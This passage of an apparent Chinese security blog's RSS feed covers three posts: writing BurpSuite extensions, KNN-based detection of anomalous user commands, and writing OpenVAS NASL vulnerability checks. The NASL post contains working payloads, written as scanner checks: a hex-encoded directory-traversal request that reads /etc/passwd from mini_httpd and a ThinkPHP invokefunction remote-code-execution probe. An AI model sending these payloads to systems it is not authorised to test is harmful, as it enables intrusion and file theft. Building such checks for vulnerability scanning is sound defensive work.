punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"analyzeRequest.newUrl--new :"</span> <span class="token operator">+</span> newUrlString<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">MalformedURLException</span> e<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（3）重新发送改变后的URL的请求</p><p>注意重新构建新的Request，这里采用的是buildHttpRequest方法。</p><pre class="line-numbers language-java"><code class="language-java">URL newUrl<span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">/*****************构建新的URL**********************/</span>    <span class="token comment" spellcheck="true">/*****************获取 http service**********************/</span>    IHttpService service <span class="token operator">=</span> messageInfo<span class="token punctuation">.</span><span class="token function">getHttpService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/*****************发送一个新的请求**********************/</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> newRequest <span class="token operator">=</span> helpers<span class="token punctuation">.</span><span class="token function">buildHttpRequest</span><span class="token punctuation">(</span>newUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>    callbacks<span class="token punctuation">.</span><span class="token function">makeHttpRequest</span><span class="token punctuation">(</span>service<span class="token punctuation">,</span> newRequest<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">MalformedURLException</span> e<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-3-修改body"><a href="#2-3-修改body" class="headerlink" title="2.3 修改body"></a>2.3 修改body</h4><h3 id="3-3-重新构建包"><a href="#3-3-重新构建包" class="headerlink" title="3.3 重新构建包"></a>3.3 重新构建包</h3><p>需要借助IExtensionHelpers接口，创建该接口对象helpers。这里以如下包为例：</p><pre><code>POST /api/v3/search/lucene/ HTTP/1.1Host: vulners.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: https://vulners.com/Content-Type: application/jsonOrigin: https://vulners.comContent-Length: 246Connection: closeCookie: _ga=GA1.2.166747250.1624591605; _gid=GA1.2.443724840.1624591605; _gat=1&#123;&quot;query&quot;:&quot;affectedSoftware.name:nginx AND affectedSoftware.version:\&quot;1.17.7\&quot;&quot;,&quot;fields&quot;:[&quot;cvss&quot;,&quot;description&quot;,&quot;id&quot;,]&#125;</code></pre><p>(1)组建header</p><p>header包括Url cookie等信息</p><pre class="line-numbers language-java"><code class="language-java">String VULNERS_API_HOST <span class="token operator">=</span> <span class="token string">"vulners.com"</span><span class="token punctuation">;</span>String VULNERS_API_PATH <span class="token operator">=</span> <span class="token string">"/api/v3/search/lucene"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//"/api/v3/burp/";</span>List<span class="token operator">&lt;</span>String<span class="token operator">></span> headers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>headers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"POST "</span> <span class="token operator">+</span> VULNERS_API_PATH  <span class="token operator">+</span> <span class="token string">"/ HTTP/1.1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>headers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"Host: "</span> <span class="token operator">+</span> VULNERS_API_HOST<span class="token punctuation">)</span><span class="token punctuation">;</span>headers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>headers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>headers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"Cookie: xxxxxxx;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）组建body</p><p>首先我们构造出Json结构的body，注意body里可以添加嵌套多层的json。</p><pre class="line-numbers language-java"><code class="language-java">JSONObject jsonBody <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Map mapBody = new HashMap();</span>jsonBody<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"query"</span><span class="token punctuation">,</span> <span class="token string">"affectedSoftware.name:"</span><span class="token operator">+</span>SoftwareName<span class="token operator">+</span><span class="token string">" AND affectedSoftware.version:\""</span><span class="token operator">+</span>SoftwareVersion<span class="token operator">+</span><span class="token string">"\""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>List<span class="token operator">&lt;</span>String<span class="token operator">></span> fields<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fields<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"cvss"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fields<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"description"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fields<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>jsonBody<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"fields"</span><span class="token punctuation">,</span>fields<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（3）发送新请求</p><p>首先使用buildHttpMessage重新构造新的request；再调用makeHttpRequest发送新的请求，获取响应值response。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> request <span class="token operator">=</span> helpers<span class="token punctuation">.</span><span class="token function">buildHttpMessage</span><span class="token punctuation">(</span>headers<span class="token punctuation">,</span> helpers<span class="token punctuation">.</span><span class="token function">stringToBytes</span><span class="token punctuation">(</span>jsonBody<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> response <span class="token operator">=</span> callbacks<span class="token punctuation">.</span><span class="token function">makeHttpRequest</span><span class="token punctuation">(</span>VULNERS_API_HOST<span class="token punctuation">,</span> <span class="token number">443</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> request<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>(4)解析response</p><p>将resposne转化为json格式的报文object，就可以精确的取值啦</p><pre class="line-numbers language-java"><code class="language-java">String responseString <span class="token operator">=</span> helpers<span class="token punctuation">.</span><span class="token function">bytesToString</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>IResponseInfo iResponseInfo <span class="token operator">=</span> helpers<span class="token punctuation">.</span><span class="token function">analyzeResponse</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>String jsonString <span class="token operator">=</span> responseString<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>iResponseInfo<span class="token punctuation">.</span><span class="token function">getBodyOffset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>JSONObject object <span class="token operator">=</span> JSONObject<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>参考连接：</p><p><a href="https://www.secpulse.com/archives/124593.html#goComment">1.从头开发一个BurpSuite数据收集插件</a></p><p><a href="https://www.jianshu.com/p/c7b480a28dc6">2.burp插件开发基础一（JAVA篇) </a></p><p><a href="https://portswigger.net/burp/extender/">3.官方插件编写示例</a></p><p><a href="http://blog.portswigger.net/2012_12_01_archive.html">4官方编写插件博客</a></p><p><a href="https://github.com/bit4woo/burp-api-drops">5.请求包的所有操作</a>  超级推荐</p><p><a href="https://t0data.gitbooks.io/burpsuite/content/chapter16.html">6 如何编写自己的burpsuite</a></p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91/">插件开发</category>
      
      
      <comments>https://m01ly.github.io/2021/05/21/burpsuite-develop/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>机器学习算法之KNN</title>
      <link>https://m01ly.github.io/2021/04/26/machine-learning-classify-knn/</link>
      <guid>https://m01ly.github.io/2021/04/26/machine-learning-classify-knn/</guid>
      <pubDate>Mon, 26 Apr 2021 07:55:26 GMT</pubDate>
      
      <description>&lt;p&gt;的函数：&lt;/p&gt;
&lt;p&gt;词频：FreqDist(words_list), 接受list类型的参数，返回词典，key是元素，value是元素出现的次数&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    fdist = FreqDist(dist).keys()
    dist_max=set(fdist[0:50])
    dist_min = set(fdist[-50:])&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;set()&lt;/strong&gt; 函数创建一个无序不重复元素集，可进行关系测试，删除重复数据，还可以计算交集、差集、并集等。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt;x = set(&amp;#39;runoob&amp;#39;)
&amp;gt;&amp;gt;&amp;gt; y = set(&amp;#39;google&amp;#39;)
&amp;gt;&amp;gt;&amp;gt; x, y
(set([&amp;#39;b&amp;#39;, &amp;#39;r&amp;#39;, &amp;#39;u&amp;#39;, &amp;#39;o&amp;#39;, &amp;#39;n&amp;#39;]), set([&amp;#39;e&amp;#39;, &amp;#39;o&amp;#39;, &amp;#39;g&amp;#39;, &amp;#39;l&amp;#39;]))   # 重复的被删除&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;1-走进KNN&quot;&gt;&lt;a href=&quot;#1-走进KNN&quot; class=&quot;headerlink&quot; title=&quot;1 走进KNN&quot;&gt;&lt;/a&gt;1 走进KNN&lt;/h2&gt;&lt;h3 id=&quot;1-k近邻算法的基本概念，原理以及应用&quot;&gt;&lt;a href=&quot;#1-k近邻算法的基本概念，原理以及应用&quot; class=&quot;headerlink&quot; title=&quot;1.k近邻算法的基本概念，原理以及应用&quot;&gt;&lt;/a&gt;1.k近邻算法的基本概念，原理以及应用&lt;/h3&gt;&lt;p&gt;KNN（K-nearest neighbor）的基本思想非常的简单朴素，即对于一个待预测的样本x ，在训练集中找到&lt;strong&gt;距离&lt;/strong&gt;其最近的k 个近邻 ，得票最高的类作为输出类别即可。当 k=1 时，则称为最近邻。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>的函数：</p><p>词频：FreqDist(words_list), 接受list类型的参数，返回词典，key是元素，value是元素出现的次数</p><pre><code>    fdist = FreqDist(dist).keys()    dist_max=set(fdist[0:50])    dist_min = set(fdist[-50:])</code></pre><p><strong>set()</strong> 函数创建一个无序不重复元素集，可进行关系测试，删除重复数据，还可以计算交集、差集、并集等。</p><pre><code>&gt;&gt;&gt;x = set(&#39;runoob&#39;)&gt;&gt;&gt; y = set(&#39;google&#39;)&gt;&gt;&gt; x, y(set([&#39;b&#39;, &#39;r&#39;, &#39;u&#39;, &#39;o&#39;, &#39;n&#39;]), set([&#39;e&#39;, &#39;o&#39;, &#39;g&#39;, &#39;l&#39;]))   # 重复的被删除</code></pre><h2 id="1-走进KNN"><a href="#1-走进KNN" class="headerlink" title="1 走进KNN"></a>1 走进KNN</h2><h3 id="1-k近邻算法的基本概念，原理以及应用"><a href="#1-k近邻算法的基本概念，原理以及应用" class="headerlink" title="1.k近邻算法的基本概念，原理以及应用"></a>1.k近邻算法的基本概念，原理以及应用</h3><p>KNN（K-nearest neighbor）的基本思想非常的简单朴素，即对于一个待预测的样本x ，在训练集中找到<strong>距离</strong>其最近的k 个近邻 ，得票最高的类作为输出类别即可。当 k=1 时，则称为最近邻。<a id="more"></a></p><p>KNN常见的算法：<br>·Brute Force<br>·K-D Tree<br>·Ball Tree</p><p> <strong>应用：</strong>kNN 可以用来进行分类或者回归 </p><h3 id="2-k近邻算法中k的选取，距离的度量以及特征归一化的必要性"><a href="#2-k近邻算法中k的选取，距离的度量以及特征归一化的必要性" class="headerlink" title="2.k近邻算法中k的选取，距离的度量以及特征归一化的必要性"></a>2.k近邻算法中k的选取，距离的度量以及特征归一化的必要性</h3><p><strong>k过大时：</strong></p><p>如果我们选取较大的k值，就相当于用较大邻域中的训练数据进行预测，这时与输入实例较远的（不相似）训练实例也会对预测起作用，使预测发生错误，k值的增大意味着整体模型变得简单。</p><p>我们想，如果k=N（N为训练样本的个数）,那么无论输入实例是什么，都将简单地预测它属于在训练实例中最多的类。这时，模型是不是非常简单，这相当于你压根就没有训练模型呀！</p><p><strong>k过小时：</strong></p><p>如果我们选取较小的k值，那么就会意味着我们的整体模型会变得复杂，容易发生过拟合！</p><p> <strong>k的选择：</strong>李航博士书上讲到，我们一般选取一个较小的数值，通常采取 交叉验证法来选取最优的k值。（<strong>也就是说，选取k值很重要的关键是实验调参，类似于神经网络选取多少层这种，通过调整超参数来得到一个较好的结果</strong>） </p><h3 id="3-k近邻法的实现：kd树原理的讲解"><a href="#3-k近邻法的实现：kd树原理的讲解" class="headerlink" title="3.k近邻法的实现：kd树原理的讲解"></a>3.k近邻法的实现：kd树原理的讲解</h3><p>4.kd树详细例子讲解</p><p>5.kd树的不足以及最差情况举例</p><p>6.k近邻方法的一些个人总结</p><h2 id="2-KNN应用1"><a href="#2-KNN应用1" class="headerlink" title="2 KNN应用1"></a>2 KNN应用1</h2><p>2.1 使用KNN检测异常操作</p><p>思路：</p><p>数据处理：</p><p><strong>处理数据：</strong></p><p>50个用户数据；每个用户15000条操作序列，每100条作为一个操作序列，所以每个用户的数据为cmd_list[150X100]，其中每个用户15000条操作序列中统计FreqDist统计最频繁使用的前50个dist_max和 最不频繁使用的后50个dist_min。</p><p>KNN只能以标量作为输入。</p><p><strong>特征：</strong>user_cmd_feature（150X3）</p><p>cmd_list中每个操作序列为cmd_block（100个命令）</p><p>f1：统计cmd_block中不重复命令的个数len(set(cmd_block))</p><p>f2: 统计（cmd_block中最频繁使用的前10个与dist_max）的交集个数（len(set()&amp;set())）</p><p>f3:统计（cmd_block中最不频繁使用的前10个与dist_min）的交集个数（len(set()&amp;set())）</p><p><strong>训练：</strong></p><p>user_cmd_feature[0:120]（120X3）：前120个操作序列作为训练序列，后30个操作序列作为测试序列</p><h1 id="anaconda中创建虚拟环境"><a href="#anaconda中创建虚拟环境" class="headerlink" title="anaconda中创建虚拟环境"></a>anaconda中创建虚拟环境</h1><p> 1、用conda创建Python虚拟环境（在conda prompt环境下完成）</p><pre><code>conda create -n douge python=2.7</code></pre><p> (注：该命令只适用于Windows环境；“environment_name”是要创建的环境名；“python=X.X”是选择的Python版本)</p><h3 id="2、激活虚拟环境（在conda-prompt环境下完成）"><a href="#2、激活虚拟环境（在conda-prompt环境下完成）" class="headerlink" title="2、激活虚拟环境（在conda prompt环境下完成）"></a>2、激活虚拟环境（在conda prompt环境下完成）</h3><pre><code>activate douge</code></pre><p> Windows: activate your_env_name(虚拟环境名称)</p><h3 id="3、给虚拟环境安装外部包"><a href="#3、给虚拟环境安装外部包" class="headerlink" title="3、给虚拟环境安装外部包"></a>3、给虚拟环境安装外部包</h3><pre><code>conda install -n douge vulners</code></pre><p> 例如: conda install -n tensorflow pandas</p><h3 id="4、查看已有的环境-当前已激活的环境会显示一个星号"><a href="#4、查看已有的环境-当前已激活的环境会显示一个星号" class="headerlink" title="4、查看已有的环境(当前已激活的环境会显示一个星号)"></a>4、查看已有的环境(当前已激活的环境会显示一个星号)</h3><pre><code>conda info -e</code></pre><h3 id="5、删除一个已有的虚拟环境"><a href="#5、删除一个已有的虚拟环境" class="headerlink" title="5、删除一个已有的虚拟环境"></a>5、删除一个已有的虚拟环境</h3><pre><code>conda remove --name your_env_name --all</code></pre><h3 id="6、查看pip的安装目录"><a href="#6、查看pip的安装目录" class="headerlink" title="6、查看pip的安装目录"></a>6、查看pip的安装目录</h3><pre><code>pip list</code></pre><p>7、删除已经安装的模块<br> <code>pip uninstall **</code><br> (例如：pip uninstall numpy)</p><p>pycharm配置虚拟环境</p><p><img src="/2021/04/26/machine-learning-classify-knn/1622551543337.png" alt="1622551543337"></p><h1 id="BUG"><a href="#BUG" class="headerlink" title="BUG"></a>BUG</h1><p>1 cross_validation等模块弃用</p><p>新的模块sklearn.model_selection，将以前的<code>sklearn.cross_validation</code>, <code>sklearn.grid_search</code> 和 <code>sklearn.learning_curve模块组合到一起</code></p><p>比如：cross_validation模块弃用，所有的包和方法都在model_selection中,包和方法名没有发生变化</p><p>将from sklearn import cross_validation</p><p>改为from sklearn import model_selection</p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/">机器学习</category>
      
      
      <comments>https://m01ly.github.io/2021/04/26/machine-learning-classify-knn/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>openvas插件开发</title>
      <link>https://m01ly.github.io/2021/04/07/openvas-develop/</link>
      <guid>https://m01ly.github.io/2021/04/07/openvas-develop/</guid>
      <pubDate>Wed, 07 Apr 2021 09:33:00 GMT</pubDate>
      
      <description>&lt;p&gt;openvas插件开发&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>openvas插件开发<a id="more"></a></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@archery-sec9001 supper-user<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># openvas-nasl -h</span>Usage:  openvas-nasl <span class="token punctuation">[</span>OPTION<span class="token punctuation">..</span>.<span class="token punctuation">]</span> NASL_FILE<span class="token punctuation">..</span>. - standalone NASL interpreter <span class="token keyword">for</span> OpenVASHelp Options:  -h, --help                          Show <span class="token function">help</span> optionsApplication Options:  -V, --version                       Display version information  -d, --debug                         Output debug information to stderr.  -D, --description                   Only run the <span class="token string">'description'</span> part of the script  -B, --both                          Run <span class="token keyword">in</span> description mode before running the script.  -p, --parse                         Only parse the script, don<span class="token string">'t execute it  -L, --lint                          '</span>lint<span class="token string">' the script (extended checks)  -t, --target=&lt;target>               Execute the scripts against &lt;target>  -T, --trace=&lt;file>                  Log actions to &lt;file> (or '</span>-<span class="token string">' for stderr)  -c, --config-file=&lt;filename>        Configuration file  -e, --source-iface=&lt;iface_name>     Source network interface for established connections.  --vendor-version=&lt;string>           Use &lt;string> as vendor version.  -s, --safe                          Specifies that the script should be run with '</span>safe checks' enabled  -X, --disable-signing               Run the script with disabled signature verification  -i, --include-dir<span class="token operator">=</span><span class="token operator">&lt;</span>dir<span class="token operator">></span>             Search <span class="token keyword">for</span> includes <span class="token keyword">in</span> <span class="token operator">&lt;</span>dir<span class="token operator">></span>  --debug-tls<span class="token operator">=</span><span class="token operator">&lt;</span>level<span class="token operator">></span>                 Enable TLS debugging at <span class="token operator">&lt;</span>level<span class="token operator">></span>  -k, --kb<span class="token operator">=</span><span class="token operator">&lt;</span>key<span class="token operator">=</span>value<span class="token operator">></span>                Set KB key to value. Can be used multiple <span class="token function">times</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>demo.nasl：输出开放的端口</p><pre><code>## Check for ssh#if(description)&#123;        script_name(english:&quot;Ensure the presence of ssh&quot;);        script_description(english:&quot;This script makes sure that ssh is running&quot;);        script_summary(english:&quot;connects on remote tcp port 22&quot;);        script_category(ACT_GATHER_INFO);        script_family(english:&quot;Administration toolbox&quot;);        script_copyright(english:&quot;This script was written by Joe U.&quot;);        script_dependencies(&quot;find_service.nes&quot;);        exit(0);&#125;#start = prompt(&quot;First port to scan ? &quot;);#end  = prompt(&quot;Last port to scan ? &quot;);for(i=1;i&lt;9999;i=i+1)&#123;        soc = open_sock_tcp(i);        if(soc)        &#123;                display(&quot;Port &quot;, i, &quot; is open\n&quot;);                close(soc);        &#125;&#125;</code></pre><h4 id="Tcp请求"><a href="#Tcp请求" class="headerlink" title="Tcp请求"></a>Tcp请求</h4><pre><code>#漏洞检测## Variable Initializationport = 8080;#mini_httpd默认端口## Check Port statusif(!get_port_state(port))&#123;        #这里经过测试一些未开放的端口返回值都是1，如果开放的话返回值就是10000，所以这里其实就可以根据这个返回值做端口检测    display(&quot;ADog:get_port_state failed.&quot;,port,&quot;\n&quot;);    exit(0);&#125;## Open the socketsock = open_sock_tcp(port);if(!sock)&#123;        #这里其实跟上面是一样的，sock端口其实都能开放的，所以这段可写可不写    display(&quot;ADog:open_sock_tcp failed.&quot;,port,&quot;\n&quot;);    exit(0);&#125;## Constructed directory traversal crafted requestreq = raw_string(0x47, 0x45, 0x54, 0x20, 0x2f, 0x65, 0x74, 0x63, 0x2f, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64, 0x20, 0x48, 0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e, 0x31, 0x0d, 0x0a, 0x48, 0x6f, 0x73, 0x74, 0x3a, 0x20, 0x0d, 0x0a, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x4d, 0x61, 0x63, 0x69, 0x6e, 0x74, 0x6f, 0x73, 0x68, 0x3b, 0x20, 0x49, 0x6e, 0x74, 0x65, 0x6c, 0x20, 0x4d, 0x61, 0x63, 0x20, 0x4f, 0x53, 0x20, 0x58, 0x20, 0x31, 0x30, 0x2e, 0x31, 0x33, 0x3b, 0x20, 0x72, 0x76, 0x3a, 0x36, 0x33, 0x2e, 0x30, 0x29, 0x20, 0x47, 0x65, 0x63, 0x6b, 0x6f, 0x2f, 0x32, 0x30, 0x31, 0x30, 0x30, 0x31, 0x30, 0x31, 0x20, 0x46, 0x69, 0x72, 0x65, 0x66, 0x6f, 0x78, 0x2f, 0x36, 0x33, 0x2e, 0x30, 0x0d, 0x0a, 0x41, 0x63, 0x63, 0x65, 0x70, 0x74, 0x3a, 0x20, 0x74, 0x65, 0x78, 0x74, 0x2f, 0x68, 0x74, 0x6d, 0x6c, 0x2c, 0x61, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x78, 0x68, 0x74, 0x6d, 0x6c, 0x2b, 0x78, 0x6d, 0x6c, 0x2c, 0x61, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x78, 0x6d, 0x6c, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x39, 0x2c, 0x2a, 0x2f, 0x2a, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x38, 0x0d, 0x0a, 0x41, 0x63, 0x63, 0x65, 0x70, 0x74, 0x2d, 0x4c, 0x61, 0x6e, 0x67, 0x75, 0x61, 0x67, 0x65, 0x3a, 0x20, 0x7a, 0x68, 0x2d, 0x43, 0x4e, 0x2c, 0x7a, 0x68, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x38, 0x2c, 0x7a, 0x68, 0x2d, 0x54, 0x57, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x37, 0x2c, 0x7a, 0x68, 0x2d, 0x48, 0x4b, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x35, 0x2c, 0x65, 0x6e, 0x2d, 0x55, 0x53, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x33, 0x2c, 0x65, 0x6e, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x32, 0x0d, 0x0a, 0x43, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x3a, 0x20, 0x63, 0x6c, 0x6f, 0x73, 0x65, 0x0d, 0x0a, 0x55, 0x70, 0x67, 0x72, 0x61, 0x64, 0x65, 0x2d, 0x49, 0x6e, 0x73, 0x65, 0x63, 0x75, 0x72, 0x65, 0x2d, 0x52, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x73, 0x3a, 0x20, 0x31, 0x0d, 0x0a, 0x0d, 0x0a);#这里最重要的就是这段poc，由于这是web服务器，因此这的payload，读者可以对这段进行16进制解码，你就会发现其实就是一个web的流量包#这里我先使用burp做了漏洞复现，然后将请求包复制下来，将其做了一次16进制转化#这里openvas其实自带http的函数，但是这里我仍然使用了socket，原因就是如果后续不是web的服务，那么web相关的函数就用不了，总的来说socket肯定是最通用的方法## send the attack request and recieve the responsedisplay(&quot;ADog:port is working.&quot;,port,&quot;\n&quot;);send(socket:sock, data:req);ret = recv(socket:sock, length:1024);#获取返回包内容close(sock);#display(&quot;ADog:recv:&quot;,ret);state = egrep(pattern:&#39;^root.*&#39;,string:ret);#openvas自带的匹配函数，这里用于匹配出现root字样，由于这个漏洞是任意文件读取，那么这里我读取的是/etc/passwd，那么就会第一条就会出现root用户的基本信息#那么如果出现了，那么就认定此漏洞存在#这里的定制化就体现在我们可以针对公司内部漏洞编写nasl脚本，其实仔细看过脚本的人就知道，目前市面上主流的扫描器其实都只是版本匹配，当然这也是为了无损扫描，也有部分payload是真的带pocif(state)&#123;  report = &#39;mini_httpd is vulnerable!\n&#39;;  security_message(data:report);  #这里使用openvas自带的报告函数将漏洞输出到扫描报告里  #security_message(port:port);  #这两个函数用一个就行了，一开始为了测试使用了这两个，最后报告里也就出现了两次  display(&#39;mini_httpd is vulnerable.\n&#39;);&#125;</code></pre><p><a href="http://foreversong.cn/archives/1333">http://foreversong.cn/archives/1333</a></p><h4 id="http请求"><a href="#http请求" class="headerlink" title="http请求"></a>http请求</h4><pre><code># 获取 www 端口，默认为 80port = get_http_port(default: 80);str = string(&quot;GET /index.php?s=index/think/app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=md5&amp;vars[1][]=Tr0y HTTP/1.0\r\n\r\n&quot;);# 发送 payload 并返回服务器的响应recv = http_send_recv(port: port, data: str);# DEBUG 使用，打印返回的 header+bodydisplay(recv, &quot;\n&quot;);</code></pre><h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><p>-X 忽略签名认证</p><p>-t target 目标主机IP/域名</p><p>-i 插件加载目录</p><pre class="line-numbers language-bash"><code class="language-bash">openvas-nasl -i /var/lib/openvas/plugins -Xt 10.27.22.76 demo2.nasl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/07/openvas-develop/1617788073176.png" alt="1617788073176"></p><h4 id="7-测试NASL脚本"><a href="#7-测试NASL脚本" class="headerlink" title="7. 测试NASL脚本"></a>7. 测试NASL脚本</h4><p>将自己写的插件复制到openvas插件库目录：<br>/var/lib/openvas/plugins<br>加载插件:<br>openvassd</p><h4 id="8-重建插件库"><a href="#8-重建插件库" class="headerlink" title="8. 重建插件库"></a>8. 重建插件库</h4><p>openvasmd 